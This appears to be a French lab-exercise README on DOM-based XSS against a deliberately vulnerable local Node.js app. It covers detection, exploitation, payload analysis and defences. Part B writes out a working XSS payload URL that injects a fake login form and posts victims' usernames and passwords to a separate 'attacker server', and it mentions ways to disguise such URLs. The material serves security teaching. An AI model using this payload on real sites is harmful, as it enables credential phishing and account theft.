# TP : Vulnérabilité DOM-based XSS

Ce TP permet d'explorer et de comprendre les vulnérabilités XSS basées sur le DOM (Document Object Model) à travers une application web vulnérable.

## Prérequis

- Node.js installé sur votre machine
- Un navigateur web moderne
- Connaissances de base en HTML, JavaScript et sécurité web

## Installation

1. Cloner le dépôt :
```bash
git clone http://github.com/bouhenic/xss.git
cd xss/xssDOMBased/vulnerableServer
```

2. Installer les dépendances :
```bash
npm install
```

## Partie A : Détection des vulnérabilités XSS

### Lancement du serveur vulnérable

1. Démarrer l'application :
```bash
node index.js
```

2. Accéder à l'application via : http://localhost:3000

### Tests de vulnérabilité

1. **Test basique** :
   - Saisir un nom de produit dans le champ de recherche
   - Observer l'URL générée : `http://localhost:3000/?query=livre`

2. **Test d'injection** :
   - Injecter des balises HTML simples via l'URL
   - Exemple : utilisation de la balise `<b>` pour du texte en gras
   - Si le texte s'affiche en gras, cela confirme une vulnérabilité DOM XSS

## Partie B : Exploitation de la vulnérabilité

### Configuration du serveur attaquant

1. Ouvrir un nouveau terminal et naviguer vers le répertoire du serveur attaquant :
```bash
cd xss/xssDOMBased/hackerServer
node index.js
```

### Simulation d'attaque

1. URL malveillante pour le test :
```
http://localhost:3000/?query=<img%20src=x%20onerror="var%20form=document.createElement('form');form.action='http://localhost:4000/login';form.method='POST';var%20message=document.createElement('p');message.textContent='Veuillez ressaisir votre code';form.appendChild(message);var%20username=document.createElement('input');username.name='username';username.placeholder='Nom%20d\'utilisateur';var%20password=document.createElement('input');password.name='password';password.placeholder='Mot%20de%20passe';password.type='password';var%20submit=document.createElement('input');submit.type='submit';submit.value='Connexion';form.appendChild(username);form.appendChild(password);form.appendChild(submit);document.body.appendChild(form);" style="display:none">
```

**Note** : Dans un scénario réel, cette URL pourrait être :
- Raccourcie via un service de réduction d'URL
- Encodée en base64
- Dissimulée derrière une redirection

## Partie C : Analyse du code malveillant

Le code injecté crée dynamiquement :
1. Un formulaire de connexion
2. Des champs pour nom d'utilisateur et mot de passe
3. Un bouton de soumission
4. Envoie les données vers `http://localhost:4000/login`

## Partie D : Mesures de sécurisation

Pour sécuriser l'application contre les attaques DOM XSS :

1. **Validation des entrées** :
   - Échapper les caractères spéciaux
   - Utiliser des listes blanches pour les entrées acceptées

2. **Manipulation sécurisée du DOM** :
   - Éviter `innerHTML`
   - Utiliser `textContent` ou `createTextNode()`

3. **En-têtes de sécurité** :
   - Implémenter Content Security Policy (CSP)
   - Utiliser X-XSS-Protection

4. **Bonnes pratiques** :
   - Utiliser des frameworks avec protection XSS intégrée
   - Maintenir les dépendances à jour

## Objectifs pédagogiques

- Comprendre le fonctionnement des attaques DOM XSS
- Apprendre à identifier les vulnérabilités XSS
- Maîtriser les techniques de sécurisation
- Sensibilisation aux risques de sécurité web

## Ressources additionnelles

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)